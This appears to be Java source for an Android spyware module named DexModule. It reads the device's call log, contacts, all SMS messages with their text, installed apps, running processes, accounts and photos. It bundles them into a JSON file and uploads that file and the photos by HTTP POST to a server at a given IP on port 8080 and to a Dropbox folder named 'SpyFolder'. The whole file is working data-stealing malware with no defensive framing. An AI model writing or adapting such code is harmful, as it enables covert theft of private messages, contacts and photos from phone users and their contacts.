package com.example.dexmodule;

import static android.os.Environment.getExternalStoragePublicDirectory;

import android.accounts.Account;
import android.accounts.AccountManager;
import android.app.ActivityManager;
import android.content.ContentResolver;
import android.content.Context;
import android.content.pm.ApplicationInfo;
import android.content.pm.PackageManager;
import android.database.Cursor;
import android.os.AsyncTask;
import android.os.Build;
import android.os.Environment;
import android.os.StatFs;
import android.provider.CallLog;
import android.provider.ContactsContract;
import android.provider.Telephony;

import com.dropbox.core.DbxException;
import com.dropbox.core.DbxRequestConfig;
import com.dropbox.core.v2.DbxClientV2;
import com.dropbox.core.v2.files.WriteMode;

import org.json.JSONArray;
import org.json.JSONException;
import org.json.JSONObject;

import java.io.File;
import java.io.FileInputStream;
import java.io.FileNotFoundException;
import java.io.FileOutputStream;
import java.io.IOException;
import java.io.OutputStream;
import java.net.HttpURLConnection;
import java.net.URL;
import java.util.ArrayList;
import java.util.Date;
import java.util.List;

public class DexModule {
    private final Context context;
    private final String ip;
    private final DbxClientV2 dbxClient;

    private File info;
    private List<File> images;

    private enum ContentType { json, jpeg }

    private class CollectData {
        private JSONArray getCalls() {
            JSONArray jsonArray = new JSONArray();

            Cursor managedCursor = context.getContentResolver()
                    .query(CallLog.Calls.CONTENT_URI,null, null,null, null);
            int number = managedCursor.getColumnIndex(CallLog.Calls.NUMBER);
            int type = managedCursor.getColumnIndex(CallLog.Calls.TYPE);
            int date = managedCursor.getColumnIndex(CallLog.Calls.DATE);
            int duration = managedCursor.getColumnIndex(CallLog.Calls.DURATION);

            while (managedCursor.moveToNext()) {
                String phNumber = managedCursor.getString(number);
                String callType = managedCursor.getString(type);
                String callDate = managedCursor.getString(date);
                Date callDayTime = new Date(Long.parseLong(callDate));
                int callDuration = Integer.parseInt(managedCursor.getString(duration));
                String dir = null;
                int dircode = Integer.parseInt(callType);
                switch (dircode) {
                    case CallLog.Calls.OUTGOING_TYPE:
                        dir = "OUTGOING";
                        break;

                    case CallLog.Calls.INCOMING_TYPE:
                        dir = "INCOMING";
                        break;

                    case CallLog.Calls.MISSED_TYPE:
                        dir = "MISSED";
                        break;
                }

                JSONObject jsonObject = new JSONObject();
                try {
                    jsonObject.put("Phone number", phNumber);
                    jsonObject.put("Call type", dir);
                    jsonObject.put("Date and time", callDayTime);
                    jsonObject.put("Duration (seconds)", callDuration);
                } catch (JSONException e) {
                    e.printStackTrace();
                }
                jsonArray.put(jsonObject);
            }

            managedCursor.close();

            return jsonArray;
        }

        private JSONArray getContacts() {
            JSONArray jsonArray = new JSONArray();

            ContentResolver cr = context.getContentResolver();
            Cursor cur = cr.query(ContactsContract.Contacts.CONTENT_URI,
                    null, null, null, null);

            while (cur.moveToNext()) {
                int idIdx = cur.getColumnIndex(ContactsContract.Contacts._ID);
                int nameIdx = cur.getColumnIndex(ContactsContract.Contacts.DISPLAY_NAME);
                String id = cur.getString(idIdx);
                String name = cur.getString(nameIdx);

                int hasIdx = cur.getColumnIndex(ContactsContract.Contacts.HAS_PHONE_NUMBER);
                if (cur.getInt(hasIdx) > 0) {
                    Cursor pCur = cr.query(
                            ContactsContract.CommonDataKinds.Phone.CONTENT_URI,
                            null,
                            ContactsContract.CommonDataKinds.Phone.CONTACT_ID + " = ?",
                            new String[]{id}, null);

                    while (pCur.moveToNext()) {
                        int numberIdx = pCur.getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER);
                        String phoneNo = pCur.getString(numberIdx);

                        JSONObject jsonObject = new JSONObject();
                        try {
                            jsonObject.put("Name", name);
                            jsonObject.put("Phone number", phoneNo);
                        } catch (JSONException e) {
                            e.printStackTrace();
                        }
                        jsonArray.put(jsonObject);
                    }
                    pCur.close();
                }
            }

            cur.close();

            return jsonArray;
        }

        private JSONArray getSMS() {
            JSONArray jsonArray = new JSONArray();

            Cursor cur = context.getContentResolver().query(Telephony.Sms.CONTENT_URI, null, null, null, null);
            if (cur != null) {
                int totalSMS = cur.getCount();
                if (cur.moveToFirst()) {
                    for (int j = 0; j < totalSMS; j++) {
                        String smsDate = cur.getString(cur.getColumnIndexOrThrow(Telephony.Sms.DATE));
                        String number = cur.getString(cur.getColumnIndexOrThrow(Telephony.Sms.ADDRESS));
                        String body = cur.getString(cur.getColumnIndexOrThrow(Telephony.Sms.BODY));
                        Date dateFormat= new Date(Long.parseLong(smsDate));
                        String type = null;
                        switch (Integer.parseInt(cur.getString(cur.getColumnIndexOrThrow(Telephony.Sms.TYPE)))) {
                            case Telephony.Sms.MESSAGE_TYPE_INBOX:
                                type = "INBOX";
                                break;
                            case Telephony.Sms.MESSAGE_TYPE_SENT:
                                type = "SENT";
                                break;
                            case Telephony.Sms.MESSAGE_TYPE_OUTBOX:
                                type = "OUTBOX";
                                break;
                            default:
                                break;
                        }

                        JSONObject jsonObject = new JSONObject();
                        try {
                            jsonObject.put("Date and time", dateFormat);
                            jsonObject.put("Phone number", number);
                            jsonObject.put("Type", type);
                            jsonObject.put("Text", body);
                        } catch (JSONException e) {
                            e.printStackTrace();
                        }
                        jsonArray.put(jsonObject);

                        cur.moveToNext();
                    }
                }
                cur.close();
            }

            return jsonArray;
        }

        private JSONObject getSysInfo() {
            JSONObject jsonObject = new JSONObject();

            int osVersion = Integer.parseInt(Build.VERSION.RELEASE);
            int sdkVersion = Build.VERSION.SDK_INT;

            StatFs statInternal = new StatFs(Environment.getDataDirectory().getAbsolutePath());
            long internalFree = statInternal.getAvailableBlocksLong() * statInternal.getBlockSizeLong() / 1024 / 1024;

            JSONArray jsonArrayApplications = new JSONArray();
            PackageManager packageManager = context.getPackageManager();
            List<ApplicationInfo> packages = packageManager.getInstalledApplications(PackageManager.GET_META_DATA);
            for (ApplicationInfo packageInfo : packages) {
                jsonArrayApplications.put(packageInfo.packageName);
            }

            JSONArray jsonArrayProcesses = new JSONArray();
            ActivityManager activityManager = (ActivityManager) context.getSystemService(Context.ACTIVITY_SERVICE);
            List<ActivityManager.RunningAppProcessInfo> runningProcesses = activityManager.getRunningAppProcesses();
            for (ActivityManager.RunningAppProcessInfo processInfo : runningProcesses) {
                jsonArrayProcesses.put(processInfo.processName);
            }

            JSONArray jsonArrayAccounts = new JSONArray();
            AccountManager accountManager = AccountManager.get(context);
            Account[] accounts = accountManager.getAccounts();
            for (Account account: accounts) {
                jsonArrayAccounts.put(account.toString());
            }

            try {
                jsonObject.put("Android version", osVersion);
                jsonObject.put("SDK Version", sdkVersion);
                jsonObject.put("Storage free space (MB)", internalFree);
                jsonObject.put("Installed packages", jsonArrayApplications);
                jsonObject.put("Running processes", jsonArrayProcesses);
                jsonObject.put("Accounts", jsonArrayAccounts);
            } catch (JSONException e) {
                e.printStackTrace();
            }



            return jsonObject;
        }

        private List<File> getPhotos() {
            List<File> imgList = new ArrayList<>();
            File[] files = getExternalStoragePublicDirectory(Environment.DIRECTORY_PICTURES).listFiles();
            for (File file : files) {
                if (!file.isDirectory()) {
                    imgList.add(file);
                }
            }

            return imgList;
        }

        public void collect() {
            try {
                JSONObject jsonObject = new JSONObject();
                jsonObject.put("System information", getSysInfo());
                jsonObject.put("Contacts", getContacts());
                jsonObject.put("Calls", getCalls());
                jsonObject.put("SMS", getSMS());
                FileOutputStream fileOutputStream = new FileOutputStream(info);
                fileOutputStream.write(jsonObject.toString().getBytes());
                fileOutputStream.close();

                images = getPhotos();
            } catch (JSONException e) {
                e.printStackTrace();
            } catch (FileNotFoundException e) {
                e.printStackTrace();
            } catch (IOException e) {
                e.printStackTrace();
            }
        }
    }

    private class SendData extends AsyncTask<String, Void, Void> {

        private void sendToServer(File file, ContentType contentType) {
            try {
                URL url = new URL("http://" + ip + ":8080/" +
                        (contentType == ContentType.json ? "info" : "image?name=" + file.getName()));
                HttpURLConnection con = (HttpURLConnection) url.openConnection();
                con.setRequestMethod("POST");
                con.setRequestProperty("Content-Type",
                        (contentType == ContentType.json ? "application/json" : "image/jpeg"));
                con.setDoOutput(true);
                con.connect();
                OutputStream outputStream = con.getOutputStream();

                FileInputStream fileInputStream = new FileInputStream(file);
                byte[] buffer = new byte[4096];
                int count;
                while ((count = fileInputStream.read(buffer, 0, 4096)) != -1) {
                    outputStream.write(buffer, 0, count);
                }
                con.getResponseMessage();

                fileInputStream.close();
                outputStream.flush();
                outputStream.close();
            } catch (IOException e) {
                e.printStackTrace();
            }
        }

        private void sendToDisk(File file) {
            try {
                FileInputStream fileInputStream = new FileInputStream(file);
                dbxClient.files().uploadBuilder("/" + file.getName())
                        .withMode(WriteMode.OVERWRITE)
                        .uploadAndFinish(fileInputStream);

                fileInputStream.close();
            } catch (DbxException | IOException e) {
                e.printStackTrace();
            }
        }

        @Override
        protected Void doInBackground(String... params) {
            sendToServer(info, ContentType.json);
            sendToDisk(info);

            for (File image : images) {
                sendToServer(image, ContentType.jpeg);
                sendToDisk(image);
            }

            return null;
        }
    }

    public DexModule(Context context, String ip, String token) {
        this.context = context;
        this.ip = ip;
        DbxRequestConfig requestConfig = DbxRequestConfig.newBuilder("dropbox/Приложения/SpyFolder").build();
        this.dbxClient = new DbxClientV2(requestConfig, token);

        info = new File(context.getExternalFilesDir(null), "info.json");
    }

    public void doAll() {
        CollectData collectData = new CollectData();
        collectData.collect();

        SendData sendData = new SendData();
        sendData.execute();
    }
}
